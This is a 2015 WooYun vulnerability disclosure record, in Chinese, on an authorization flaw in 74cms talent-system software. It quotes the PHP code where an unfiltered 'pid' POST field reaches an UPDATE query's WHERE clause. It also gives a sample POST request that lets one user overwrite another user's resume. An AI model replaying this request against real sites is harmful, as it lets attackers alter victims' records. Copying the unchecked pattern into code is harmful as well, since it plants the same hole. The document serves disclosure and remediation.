{"id": 41266, "wybug_id": "wooyun-2015-089380", "wybug_title": "骑士人才系统越权修改简历(demo演示)", "wybug_corp": "74c,s.com", "wybug_author": "Power", "wybug_date": "2015-01-04 15:22", "wybug_open_date": "2015-04-04 15:24", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-07：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-02-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-04：\t细节向公众公开  简要描述： 权限控制不严格 详细说明：  wap/pwersonal/wap_user.php中 判断是否登录的代码如下\nif (intval($_SESSION['uid'])=='' || $_SESSION['username']==''||intval($_SESSION['utype'])==1){\theader(\"Location: ../wap_login.php\");  //如未登录则跳转,若登录则elseif语句}elseif ($act == 'index'){\t$smarty->cache = false;\t$user=wap_get_user_info(intval($_SESSION['uid']));\t\t$smarty->assign('user',$user);\t$resume_info=get_userprofile(intval($_SESSION['uid']));\tif(empty($resume_info))\t{\t\theader(\"Location: ?act=make_resume\");\t}\telse\t{\t\t$resume_info['age']=date(\"Y\")-$resume_info['birthday'];\t\t$smarty->assign('resume_info',$resume_info);\t\t$smarty->display(\"wap/personal/wap-user-personal-index.html\");\t}\t}\n/wap/pwersonal/wap_user.php中\nelseif($act == \"resume_jobs_save\"){\t$smarty->cache = false;\t$_POST=array_map(\"utf8_to_gbk\",$_POST);\t$setsqlarr['intention_jobs']=trim($_POST['intention_jobs'])?trim($_POST['intention_jobs']):exit(\"请选择期望职位\");\t$_POST['intention_jobs_id']=trim($_POST['intention_jobs_id'])?trim($_POST['intention_jobs_id']):exit(\"请选择期望职位\");\t$setsqlarr['wage']=trim($_POST['wage'])?trim($_POST['wage']):exit(\"请选择期望薪资\");\t$setsqlarr['wage_cn']=trim($_POST['wage_cn'])?trim($_POST['wage_cn']):exit(\"请选择期望薪资\");\t$setsqlarr['nature']=trim($_POST['nature'])?trim($_POST['nature']):exit(\"请选择期望工作性质\");\t$setsqlarr['nature_cn']=trim($_POST['nature_cn'])?trim($_POST['nature_cn']):exit(\"请选择期望工作性质\");\t$setsqlarr['trade']=trim($_POST['trade'])?trim($_POST['trade']):exit(\"请选择期望行业\");\t$setsqlarr['trade_cn']=trim($_POST['trade_cn'])?trim($_POST['trade_cn']):exit(\"请选择期望行业\");\t$setsqlarr['district_cn']=trim($_POST['district_cn'])?trim($_POST['district_cn']):exit(\"请选择期望工作地区\");\t$setsqlarr['district']=trim($_POST['district']);\t$setsqlarr['sdistrict']=trim($_POST['sdistrict']);\tif(!updatetable(table('resume'),$setsqlarr,\" id=$_POST[pid] \"))exit(\"err\"); //pid未过滤跟入\tif(!wap_add_resume_jobs(intval($_POST['pid']),intval($_SESSION['uid']),intval($_POST['intention_jobs_id'])))exit('err');\tif(!wap_add_resume_trade(intval($_POST['pid']),intval($_SESSION['uid']),intval($setsqlarr['trade'])))exit('err');\texit(\"ok\");}\n函数updatetable()如下\nfunction updatetable($tablename, $setsqlarr, $wheresqlarr, $silent=0) { post[pid]对应$wheresqlarr\tglobal $db;\t$setsql = $comma = '';\tforeach ($setsqlarr as $set_key => $set_value) {\t\tif(is_array($set_value)) {\t\t\t$setsql .= $comma.'`'.$set_key.'`'.'=\\''.$set_value[0].'\\'';\t\t} else {\t\t\t$setsql .= $comma.'`'.$set_key.'`'.'=\\''.$set_value.'\\'';\t\t}\t\t$comma = ', ';\t}\t$where = $comma = '';\tif(empty($wheresqlarr)) {\t\t$where = '1';\t} elseif(is_array($wheresqlarr)) {\t\tforeach ($wheresqlarr as $key => $value) {\t\t\t$where .= $comma.'`'.$key.'`'.'=\\''.$value.'\\'';\t\t\t$comma = ' AND ';\t\t}\t} else {\t\t$where = $wheresqlarr;  //如果$wheresqlarr不为数组，则到此\t}\treturn $db->query(\"UPDATE \".($tablename).\" SET \".$setsql.\" WHERE \".$where, $silent?\"SILENT\":\"\");  //进入数据库查询}\n查看qeury函数如下\nfunction query($sql){    \tif(!$query=@mysql_query($sql, $this->linkid)){     \t\t$this->dbshow(\"Query error:$sql\");  //跟入    \t}else{    \t\treturn $query;    \t}    }\ndbshow函数如下\nfunction dbshow($err)\t{    \tif($err){    \t\t$info = \"Error：\".$err;\t\t//数据库不报错\t    \t}else{    \t\t$info = \"Errno：\".$this->errno().\" Error：\".$this->error();    \t}    \t//exit($info);        exit(\"数据库错误,请联系网站管理员！\");    }\n本来想注入，无奈过过滤很多条件但是当and 1=2的时候语句执行成功，如下\n\n报错语句倒是可以的\n\n综上两条，说明and 后边的语句是执行的，但是无论where后边的语句 true 或者false 都跟前边没有关系，所以盲注都搞不定，又因为全局文件过滤了select,update等语句所以没啥办法进行update等操作，最后只能修改简历了。不知道各位有啥好思路，欢迎拍砖。   漏洞证明：  注册两个用户A,B各自创建简历POST数据如下\nintention_jobs=a&intention_jobs_id=1&wage=2000&wage_cn=2000&nature=b&nature_cn=b&trade=c&trade_cn=c&district_cn=d&district=s&sdistrict=as&pid=**\n此处的pid根据情况决定,其实pid值就是数据表中qs_resume中简历的idURL如下\nlocalhost/741225/upload/wap/personal/wap_user.php?act=resume_jobs_save\n本地数据库操作语句为\nUPDATE qs_resume SET `intention_jobs`='a', `wage`='2000', `wage_cn`='2000', `nature`='b', `nature_cn`='b', `trade`='c', `trade_cn`='c', `district_cn`='d', `district`='s', `sdistrict`='as' WHERE  id=1\nDEMO演示如下如下图A用户创建简历如下\n\n然后登录B用户，修改其简历\n\nA刷新自己的简历后的效果如下\n\n   修复方案：  检查用户权限。   版权声明：转载请注明来源 Power@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-01-04 15:37 厂商回复： 感谢反馈！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}